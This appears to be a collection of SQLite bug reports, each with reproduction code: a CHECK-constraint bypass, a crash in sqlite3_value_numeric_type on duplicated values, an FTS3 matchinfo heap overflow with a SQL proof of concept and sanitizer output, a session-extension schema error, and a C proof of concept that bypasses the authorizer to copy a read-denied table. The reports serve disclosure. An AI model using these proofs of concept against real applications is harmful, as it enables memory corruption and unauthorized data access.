Hi,

I found that in a certain context, the CHECK(changes()=0) constraint can be bypassed and insert rows that should have been rejected.

This is the test case:
CREATE TABLE src(x, CHECK(changes()=0));
CREATE TABLE dest_fast(x, CHECK(changes()=0));
CREATE TABLE dest_ref(x, CHECK(changes()=0));

INSERT INTO src VALUES(42);
SELECT 'changes_after_src_insert' AS phase, changes() AS value;
╭──────────────────────────┬───────╮
│          phase           │ value │
╞══════════════════════════╪═══════╡
│ changes_after_src_insert │     1 │
╰──────────────────────────┴───────╯

INSERT INTO dest_fast SELECT * FROM src;
SELECT 'fast_path_rows' AS phase, group_concat(x, ',') AS value FROM dest_fast;
╭────────────────┬───────╮
│     phase      │ value │
╞════════════════╪═══════╡
│ fast_path_rows │ 42    │
╰────────────────┴───────╯

INSERT INTO dest_ref SELECT * FROM src ORDER BY 1;
-- Error near line 10: CHECK constraint failed: changes()=0

SELECT 'ref_rows' AS phase, group_concat(x, ',') AS value FROM dest_ref;
╭──────────┬───────╮
│  phase   │ value │
╞══════════╪═══════╡
│ ref_rows │       │
╰──────────┴───────╯

I can reproduce this with the trunk version 8cc0b52cca2d6b15

Hi,

I found that calling sqlite3_value_numeric_type() on a value returned by sqlite3_value_dup() can crash SQLite when the duplicated value is TEXT.

This is the Poc:
#include "sqlite3ext.h"
SQLITE_EXTENSION_INIT1

static void dup_numeric_type_func(
sqlite3_context *ctx,
int argc,
sqlite3_value **argv
){
sqlite3_value *pDup;
int eType;

(void)argc;
pDup = sqlite3_value_dup(argv[0]);
if( pDup==0 ){
sqlite3_result_error_nomem(ctx);
return;
}

eType = sqlite3_value_numeric_type(pDup);
sqlite3_result_int(ctx, eType);
sqlite3_value_free(pDup);
}

#ifdef _WIN32
__declspec(dllexport)
#endif
int sqlite3_dupnumerictype_init(
sqlite3 *db,
char **pzErrMsg,
const sqlite3_api_routines *pApi
){
(void)pzErrMsg;
SQLITE_EXTENSION_INIT2(pApi);
return sqlite3_create_function(
db, "dup_numeric_type", 1, SQLITE_UTF8 | SQLITE_DETERMINISTIC,
0, dup_numeric_type_func, 0, 0
);
}

This is the SQL driver:
.load /path-to/dup_numeric_type_ext sqlite3_dupnumerictype_init

SELECT dup_numeric_type('123') AS text_path_type;

This is the command:
gcc -fPIC -shared dup_numeric_type_ext.c -o dup_numeric_type_ext.so
sqlite3 -box :memory: < dup_numeric_type_crash.sql

I can reproduce this with the trunk version 8cc0b52cca2d6b15

The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In ext/fts3/fts3_snippet.c at fts3ExprLHits() line 890, the bitmap word index is computed as (iCol+1)/32 instead of iCol/32, so when the column count is a multiple of 32 and iCol equals the last column the write lands one u32 element past the allocated buffer and produces a left shift of 1 by 31 places.

PoC
SQL script (vuln_001.sql):
-- PoC for FTS3 matchinfo('b') heap buffer overflow (off-by-one in bitmap index)
-- Bug: fts3ExprLHits() line 890 uses (iCol+1)/32 instead of iCol/32
-- When nCol=32, buffer has 1 u32 element, but iCol=31 writes to index 1 (OOB)
-- ============================================================
-- Test 1: 32 columns (minimum trigger case)
-- Buffer size = (32+31)/32 = 1 u32. iCol=31 => (31+1)/32 = 1 => OOB write
-- ============================================================
CREATE VIRTUAL TABLE t32 USING fts3(
c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,
c16,c17,c18,c19,c20,c21,c22,c23,c24,c25,c26,c27,c28,c29,c30,c31
);
INSERT INTO t32(c31) VALUES('trigger');
INSERT INTO t32(c31) VALUES('overflow');
INSERT INTO t32(c31) VALUES('heap');
INSERT INTO t32(c31) VALUES('trigger overflow heap');
-- Multiple MATCH queries to stress the allocator
SELECT matchinfo(t32, 'b') FROM t32 WHERE t32 MATCH 'trigger';
SELECT matchinfo(t32, 'b') FROM t32 WHERE t32 MATCH 'overflow';
SELECT matchinfo(t32, 'b') FROM t32 WHERE t32 MATCH 'heap';
SELECT matchinfo(t32, 'b') FROM t32 WHERE t32 MATCH 'trigger OR overflow';
SELECT matchinfo(t32, 'b') FROM t32 WHERE t32 MATCH 'trigger AND overflow';
SELECT matchinfo(t32, 'b') FROM t32 WHERE t32 MATCH 'trigger OR overflow OR heap';
DROP TABLE t32;
-- ============================================================
-- Test 2: 64 columns (another multiple of 32)
-- Buffer size = (64+31)/32 = 2 u32s. iCol=63 => (63+1)/32 = 2 => OOB write
-- ============================================================
CREATE VIRTUAL TABLE t64 USING fts3(
c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,
c16,c17,c18,c19,c20,c21,c22,c23,c24,c25,c26,c27,c28,c29,c30,c31,
c32,c33,c34,c35,c36,c37,c38,c39,c40,c41,c42,c43,c44,c45,c46,c47,
c48,c49,c50,c51,c52,c53,c54,c55,c56,c57,c58,c59,c60,c61,c62,c63
);
INSERT INTO t64(c63) VALUES('trigger');
INSERT INTO t64(c63) VALUES('overflow');
INSERT INTO t64(c63) VALUES('heap');
INSERT INTO t64(c63) VALUES('trigger overflow heap');
INSERT INTO t64(c31) VALUES('boundary');
INSERT INTO t64(c31,c63) VALUES('cross','boundary');
SELECT matchinfo(t64, 'b') FROM t64 WHERE t64 MATCH 'trigger';
SELECT matchinfo(t64, 'b') FROM t64 WHERE t64 MATCH 'overflow';
SELECT matchinfo(t64, 'b') FROM t64 WHERE t64 MATCH 'heap';
SELECT matchinfo(t64, 'b') FROM t64 WHERE t64 MATCH 'trigger OR overflow OR heap';
SELECT matchinfo(t64, 'b') FROM t64 WHERE t64 MATCH 'boundary';
SELECT matchinfo(t64, 'b') FROM t64 WHERE t64 MATCH 'cross AND boundary';
DROP TABLE t64;
-- ============================================================
-- Test 3: Repeated iterations to increase crash probability
-- Small allocations around the OOB write region
-- ============================================================
CREATE VIRTUAL TABLE t32b USING fts3(
c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,
c16,c17,c18,c19,c20,c21,c22,c23,c24,c25,c26,c27,c28,c29,c30,c31
);
-- Insert many rows hitting the last column to stress repeated OOB writes
INSERT INTO t32b(c31) VALUES('alpha');
INSERT INTO t32b(c31) VALUES('bravo');
INSERT INTO t32b(c31) VALUES('charlie');
INSERT INTO t32b(c31) VALUES('delta');
INSERT INTO t32b(c31) VALUES('echo');
INSERT INTO t32b(c31) VALUES('foxtrot');
INSERT INTO t32b(c31) VALUES('golf');
INSERT INTO t32b(c31) VALUES('hotel');
INSERT INTO t32b(c31) VALUES('india');
INSERT INTO t32b(c31) VALUES('juliet');
INSERT INTO t32b(c31) VALUES('alpha bravo charlie delta echo foxtrot golf hotel india juliet');
-- Many queries each triggering the OOB write
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'alpha';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'bravo';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'charlie';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'delta';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'echo';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'foxtrot';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'golf';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'hotel';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'india';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'juliet';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'alpha OR bravo OR charlie';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'delta OR echo OR foxtrot';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'golf OR hotel OR india OR juliet';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'alpha OR bravo OR charlie OR delta OR echo OR foxtrot OR golf OR hotel OR india OR juliet';
-- Multi-phrase queries: each phrase gets its own bitmap buffer,
-- increasing likelihood one OOB write corrupts adjacent phrase's data
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH '"alpha bravo"';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'alpha NEAR bravo';
SELECT matchinfo(t32b, 'b') FROM t32b WHERE t32b MATCH 'alpha NEAR/5 charlie';
DROP TABLE t32b;
-- ============================================================
-- Test 4: 96 columns (3 * 32, another boundary)
-- Buffer size = (96+31)/32 = 3 u32s. iCol=95 => (95+1)/32 = 3 => OOB write
-- ============================================================
CREATE VIRTUAL TABLE t96 USING fts3(
c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,
c16,c17,c18,c19,c20,c21,c22,c23,c24,c25,c26,c27,c28,c29,c30,c31,
c32,c33,c34,c35,c36,c37,c38,c39,c40,c41,c42,c43,c44,c45,c46,c47,
c48,c49,c50,c51,c52,c53,c54,c55,c56,c57,c58,c59,c60,c61,c62,c63,
c64,c65,c66,c67,c68,c69,c70,c71,c72,c73,c74,c75,c76,c77,c78,c79,
c80,c81,c82,c83,c84,c85,c86,c87,c88,c89,c90,c91,c92,c93,c94,c95
);
INSERT INTO t96(c95) VALUES('trigger');
INSERT INTO t96(c95) VALUES('overflow');
INSERT INTO t96(c31) VALUES('boundary32');
INSERT INTO t96(c63) VALUES('boundary64');
INSERT INTO t96(c31,c63,c95) VALUES('multi','boundary','hit');
SELECT matchinfo(t96, 'b') FROM t96 WHERE t96 MATCH 'trigger';
SELECT matchinfo(t96, 'b') FROM t96 WHERE t96 MATCH 'overflow';
SELECT matchinfo(t96, 'b') FROM t96 WHERE t96 MATCH 'boundary32';
SELECT matchinfo(t96, 'b') FROM t96 WHERE t96 MATCH 'boundary64';
SELECT matchinfo(t96, 'b') FROM t96 WHERE t96 MATCH 'trigger OR overflow OR boundary32 OR boundary64';
SELECT matchinfo(t96, 'b') FROM t96 WHERE t96 MATCH 'multi OR boundary OR hit';
DROP TABLE t96;
.quit

Trigger output:
yuelinwang@XXF-GPU-03:/data/ylwang/LargeScan/targets/sqlite$ ./sqlite3 < /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_fts3_fts3_snippet/vuln_001.sql
sqlite3.c:210026:51: runtime error: left shift of 1 by 31 places cannot be represented in type 'int'

Hi, this is my first SQLite bug report, so I may be misunderstanding the session API.

I found what looks like a session-extension API state bug. I reduced it to the standalone C program at the bottom. It shows that a successful sqlite3changeset_apply_v3() call with
SQLITE_CHANGESETAPPLY_FKNOACTION on an empty changeset causes a later sqlite3session_diff() on the same compatible tables to return SQLITE_SCHEMA.

Tested with:

SQLite version: 3.54.0
SQLITE_SOURCE_ID:
2026-05-19 15:13:03 00d546812810252a4d51ff796931dc2ff5bdd5173ddb8f95fb5efccd897087ff
Build flags:
-DSQLITE_ENABLE_SESSION -DSQLITE_ENABLE_PREUPDATE_HOOK
Platform: macOS arm64. Compiler: Apple Clang

Summary:

Create compatible main.t1 and aux.t1 tables.
Create a session on "main".
Call sqlite3session_diff(session, "aux", "t1", &err). This returns SQLITE_OK.
Call sqlite3changeset_apply_v3() on an empty changeset with
SQLITE_CHANGESETAPPLY_FKNOACTION. This returns SQLITE_OK.
Call sqlite3session_diff(session, "aux", "t1", &err) again.

Observed:

The second sqlite3session_diff() returns SQLITE_SCHEMA.

Expected:

The second sqlite3session_diff() should still return SQLITE_OK, because no
schema changed and main.t1 and aux.t1 are still compatible. The FKNOACTION flag
is documented as making foreign key constraints behave as NO ACTION for the
apply call; I do not see documentation indicating that it should invalidate an
existing session/table so that a later diff reports a schema mismatch.

Program output:
first sqlite3session_diff: rc=0 err=(null)
sqlite3changeset_apply_v3 FKNOACTION empty: rc=0
second sqlite3session_diff: rc=17 err=(null)

The following code reproduces it:
/*
** Reproducer: sqlite3changeset_apply_v3(..., FKNOACTION) causes a later
** sqlite3session_diff() on an existing session/table pair to fail with
** SQLITE_SCHEMA.
**
** Build with a SQLite amalgamation that has the session extension enabled.
** Put this file next to sqlite3.c and sqlite3.h, then run:
**
**   cc -g -O0 \
**     -DSQLITE_ENABLE_SESSION -DSQLITE_ENABLE_PREUPDATE_HOOK \
**     sqlite3.c session_diff_fknoaction_schema.c \
**     -lpthread -o /tmp/session_diff_fknoaction_schema
**
** If sqlite3.c/sqlite3.h are elsewhere, replace "sqlite3.c" and add the
** appropriate -I path. For example:
**
**   cc -g -O0 \
**     -DSQLITE_ENABLE_SESSION -DSQLITE_ENABLE_PREUPDATE_HOOK \
**     -I /path/to/sqlite-amalgamation \
**     /path/to/sqlite-amalgamation/sqlite3.c session_diff_fknoaction_schema.c \
**     -lpthread -o /tmp/session_diff_fknoaction_schema
**
** Expected output on affected trunk:
**
**   first sqlite3session_diff: rc=0
**   sqlite3changeset_apply_v3 FKNOACTION empty: rc=0
**   second sqlite3session_diff: rc=17 err=(null)
*/

#include "sqlite3.h"
#include <stdio.h>
#include <stdlib.h>

static void execsql(sqlite3 *db, const char *sql){
char *zErr = 0;
int rc = sqlite3_exec(db, sql, 0, 0, &zErr);
if( rc!=SQLITE_OK ){
fprintf(stderr, "SQL failed rc=%d sql=%s err=%s\n",
rc, sql, zErr ? zErr : sqlite3_errmsg(db));
sqlite3_free(zErr);
exit(1);
}
}

static int xConflict(void *pCtx, int eConflict, sqlite3_changeset_iter *pIter){
(void)pCtx;
(void)eConflict;
(void)pIter;
return SQLITE_CHANGESET_OMIT;
}

int main(void){
sqlite3 *db = 0;
sqlite3_session *pSession = 0;
char *zErr = 0;
char emptyChangeset[1] = {0};
int rc;

rc = sqlite3_open(":memory:", &db);
if( rc!=SQLITE_OK ){
fprintf(stderr, "open failed rc=%d\n", rc);
return 1;
}

execsql(db, "CREATE TABLE t1(a INTEGER PRIMARY KEY, b TEXT, c INTEGER)");
execsql(db, "ATTACH ':memory:' AS aux");
execsql(db, "CREATE TABLE aux.t1(a INTEGER PRIMARY KEY, b TEXT, c INTEGER)");

rc = sqlite3session_create(db, "main", &pSession);
if( rc!=SQLITE_OK ){
fprintf(stderr, "sqlite3session_create failed rc=%d\n", rc);
return 1;
}

rc = sqlite3session_diff(pSession, "aux", "t1", &zErr);
printf("first sqlite3session_diff: rc=%d err=%s\n",
rc, zErr ? zErr : "(null)");
sqlite3_free(zErr);
zErr = 0;

rc = sqlite3changeset_apply_v3(
db, 0, emptyChangeset, 0, xConflict, 0, 0, 0,
SQLITE_CHANGESETAPPLY_FKNOACTION
);
printf("sqlite3changeset_apply_v3 FKNOACTION empty: rc=%d\n", rc);

rc = sqlite3session_diff(pSession, "aux", "t1", &zErr);
printf("second sqlite3session_diff: rc=%d err=%s\n",
rc, zErr ? zErr : "(null)");
sqlite3_free(zErr);

sqlite3session_delete(pSession);
sqlite3_close(db);
return rc==SQLITE_OK ? 0 : 2;
}

The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In src/insert.c the xferOptimization() fast path at lines 3053 to 3444 handles INSERT INTO t1 SELECT * FROM t2 by copying raw B-tree records from source to destination without calling sqlite3Select(). The authorizer callbacks SQLITE_SELECT, table-level SQLITE_READ, and per-column sqlite3AuthRead() are skipped for the source table. An attacker holding only INSERT privilege on a compatible destination table can exfiltrate the full contents of a table whose READ access is denied by sqlite3_set_authorizer().

PoC
C program (poc_xfer_auth.c):
/* PoC: xfer optimization bypasses authorizer SQLITE_READ/SQLITE_SELECT */
#include <stdio.h>
#include <string.h>
#include "sqlite3.h"

static int auth_cb(void *pUserData, int op, const char *a, const char *b,
const char *c, const char *d) {
const char *opName = "?";
switch (op) {
case SQLITE_CREATE_TABLE: opName = "CREATE_TABLE"; break;
case SQLITE_INSERT:       opName = "INSERT"; break;
case SQLITE_SELECT:       opName = "SELECT"; break;
case SQLITE_READ:         opName = "READ"; break;
case SQLITE_UPDATE:       opName = "UPDATE"; break;
case SQLITE_DELETE:       opName = "DELETE"; break;
case SQLITE_TRANSACTION:  opName = "TRANSACTION"; break;
case SQLITE_FUNCTION:     opName = "FUNCTION"; break;
case SQLITE_PRAGMA:       opName = "PRAGMA"; break;
case SQLITE_REINDEX:      opName = "REINDEX"; break;
}
printf("  [AUTH] op=%-13s arg1=%-20s arg2=%s\n",
opName, a?a:"(null)", b?b:"(null)");

/* Deny ALL read access to "protected_table" */
if ((op == SQLITE_READ || op == SQLITE_SELECT) && a && strcmp(a,"protected_table")==0) {
printf("  [AUTH] >>> DENY read on protected_table <<<\n");
return SQLITE_DENY;
}
if (op == SQLITE_READ && b && a && strcmp(a,"protected_table")==0) {
return SQLITE_DENY;
}
return SQLITE_OK;
}

static int print_row(void *u, int n, char **v, char **c) {
for (int i=0;i<n;i++) printf("    %s=%s%s", c[i], v[i]?v[i]:"NULL", i==n-1?"\n":" | ");
return 0;
}

int main(void) {
sqlite3 *db;
char *err = 0;
int rc;

if (sqlite3_open(":memory:", &db) != SQLITE_OK) {
fprintf(stderr, "open failed\n");
return 1;
}

/* Setup data WITHOUT authorizer */
sqlite3_exec(db,
"CREATE TABLE protected_table(id INTEGER, secret TEXT);"
"INSERT INTO protected_table VALUES(1,'TOP_SECRET_A'),(2,'TOP_SECRET_B');",
0, 0, &err);
if (err) { fprintf(stderr,"setup: %s\n", err); return 1; }

/* Now install authorizer */
sqlite3_set_authorizer(db, auth_cb, 0);

printf("=== Test 1: direct SELECT (should be DENIED) ===\n");
rc = sqlite3_exec(db, "SELECT * FROM protected_table;", print_row, 0, &err);
printf("  result: rc=%d err=%s\n\n", rc, err?err:"(none)");
sqlite3_free(err); err=0;

printf("=== Test 2: xfer-optimization INSERT (BUG: bypasses READ check) ===\n");
rc = sqlite3_exec(db,
"CREATE TABLE exfil(id INTEGER, secret TEXT);"
"INSERT INTO exfil SELECT * FROM protected_table;",
0, 0, &err);
printf("  result: rc=%d err=%s\n\n", rc, err?err:"(none)");
sqlite3_free(err); err=0;

printf("=== Test 3: read exfiltrated data from exfil (allowed) ===\n");
rc = sqlite3_exec(db, "SELECT * FROM exfil;", print_row, 0, &err);
printf("  result: rc=%d err=%s\n", rc, err?err:"(none)");
sqlite3_free(err);

sqlite3_close(db);
return 0;
}

Build and run:
gcc -I. poc_xfer_auth.c sqlite3.c -o poc_xfer_auth -lpthread -ldl -lm
./poc_xfer_auth

